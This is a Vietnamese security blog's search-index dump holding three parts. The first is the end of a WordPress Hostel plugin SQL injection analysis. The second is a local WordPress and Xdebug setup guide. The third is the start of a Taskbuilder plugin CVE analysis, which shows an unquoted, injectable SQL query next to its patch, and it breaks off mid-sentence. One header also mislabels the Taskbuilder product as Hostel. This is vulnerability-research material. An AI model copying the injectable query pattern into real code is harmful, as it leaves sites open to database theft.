Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size M·∫∑c ƒë·ªãnh, WordPress ph·ª• thu·ªôc v√†o c·∫•u h√¨nh PHP (upload_max_filesize, post_max_size, v√† ƒë√¥i khi c·∫£ max_execution_time) ƒë·ªÉ x√°c ƒë·ªãnh dung l∆∞·ª£ng file t·ªëi ƒëa c√≥ th·ªÉ upload. Tr√™n nhi·ªÅu hosting, gi·ªõi h·∫°n n√†y ch·ªâ kho·∫£ng 2MB ‚Äì 8MB, kh√¥ng ƒë·ªß cho c√°c plugin hi·ªán ƒë·∫°i.\nWhy Increase the Limit? Plugin dung l∆∞·ª£ng l·ªõn: C√°c plugin nh∆∞ WooCommerce extension, page builder, backup, ho·∫∑c security suite c√≥ th·ªÉ n·∫∑ng 20MB ‚Äì 100MB.\nTr√°nh l·ªói upload: N·∫øu file .zip l·ªõn h∆°n gi·ªõi h·∫°n, b·∫°n s·∫Ω g·∫∑p l·ªói:\n‚ÄúThe uploaded file exceeds the upload_max_filesize directive in php.ini‚Äù Ho·∫∑c upload th·∫•t b·∫°i. Thu·∫≠n ti·ªán cho qu·∫£n tr·ªã vi√™n: C√≥ th·ªÉ c√†i tr·ª±c ti·∫øp qua Dashboard m√† kh√¥ng c·∫ßn FTP/SSH.\nH·ªó tr·ª£ ph√°t tri·ªÉn plugin: Plugin t·ª± vi·∫øt k√®m nhi·ªÅu th∆∞ vi·ªán/asset c√≥ th·ªÉ kh√° n·∫∑ng, vi·ªác tƒÉng gi·ªõi h·∫°n gi√∫p test d·ªÖ d√†ng h∆°n.\nHow to Increase Plugin Upload Size S·ª≠a php.ini (n·∫øu c√≥ quy·ªÅn server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 S·ª≠a file .htaccess (n·∫øu d√πng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Th√™m v√†o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); üëâ L·ªùi khuy√™n: Ch·ªâ n√™n ƒë·∫∑t gi·ªõi h·∫°n v·ª´a ƒë·ªß (64MB ho·∫∑c 128MB). Tr√°nh ƒë·∫∑t qu√° l·ªõn ƒë·ªÉ h·∫°n ch·∫ø nguy c∆° b·ªã upload file n·∫∑ng g√¢y qu√° t·∫£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Taskbuilder c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.0.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) v√† v4.0.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n '...'. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ OR, AND,...) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/admin/projects/get_users.php\nTrong phi√™n b·∫£n v4.0.1, bi·∫øn $proj_id sau khi escape ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u truy v·∫•n m√† kh√¥ng c√≥ d·∫•u nh√°y ƒë∆°n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); ·ªû b·∫£n v4.0.2, truy v·∫•n ƒë√£ ƒë∆∞·ª£c ƒëi·ªÅu ch·ªânh b·∫±ng c√°ch ƒë·∫∑t $proj_id trong d·∫•u nh√°y ƒë∆°n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); B·∫£n v√° n√†y ƒë·∫£m b·∫£o r·∫±ng gi√° tr·ªã $proj_id sau khi escape ƒë∆∞·ª£c coi l√† m·ªôt chu·ªói literal, kh√¥ng th·ªÉ tho√°t ra kh·ªèi d·∫•u nh√°y ƒë∆°n ƒë·ªÉ ch√®n th√™m c√∫ ph√°p SQL, qua ƒë√≥ ngƒÉn ch·∫∑n t·∫•n c√¥ng SQL Injection.\nHow it work? File architecture:\nC·∫•u tr√∫c chung c·ªßa file hi·ªán t·∫°i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o n·ªôi dung ch√≠nh (body) c·ªßa modal ob_start(); // ... render HTML danh s√°ch users $body = ob_get_clean(); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o ph·∫ßn footer c·ªßa modal ob_start(); // ... render HTML c√°c n√∫t thao t√°c (Close, Save) $footer = ob_get_clean(); // Tr·∫£ d·ªØ li·ªáu JSON ƒë·ªÉ frontend hi·ªÉn th·ªã modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: L·∫•y d·ªØ li·ªáu project t·ª´ database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay v√¨ xu·∫•t tr·ª±c ti·∫øp, gi√∫p gom n·ªôi dung v√†o bi·∫øn. $body / $footer: Ch·ª©a n·ªôi dung HTML ƒë·ªông c·ªßa modal. json_encode(): Tr·∫£ JSON cho client, c√≥ kh·∫£ nƒÉng ƒë∆∞·ª£c s·ª≠ d·ª•ng trong Ajax ƒë·ªÉ hi·ªÉn th·ªã modal m√† kh√¥ng c·∫ßn refresh trang. File n·∫±m trong th∆∞ m·ª•c includes cho th·∫•y r·∫±ng n√≥ s·∫Ω ƒë∆∞·ª£c g·ªçi ·ªü 1 ch·ª©c nƒÉng n√†o ƒë√≥ ·ªü n∆°i kh√°c. ƒê·ªÉ bi·∫øt ch·ª©c nƒÉng n√†o s·ª≠ d·ª•ng n√≥, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_users.php trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ N√≥ ƒë∆∞·ª£c include trong h√†m wppm_get_users() c·ªßa class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() l√† callback c·ªßa action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } add_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. wp_ajax_wppm_get_users l√† t√™n hook Ajax, v·ªõi quy t·∫Øc ƒë·∫∑t t√™n: wp_ajax_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ƒë√£ ƒëƒÉng nh·∫≠p. wp_ajax_nopriv_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ch∆∞a ƒëƒÉng nh·∫≠p. ·ªû ƒë√¢y, action = wppm_get_users. Nghƒ©a l√† n·∫øu trong Ajax request b·∫°n g·ª≠i action=wppm_get_users t·ªõi admin-ajax.php, th√¨ WordPress s·∫Ω t√¨m callback t∆∞∆°ng ·ª©ng ƒë·ªÉ x·ª≠ l√Ω, ·ªü ƒë√¢y l√† wppm_get_users(). üëâ Ta ƒë√£ bi·∫øt ƒë∆∞·ª£c action = wppm_get_users, ki·ªÉm tra xem Ajax n√†o s·ª≠ 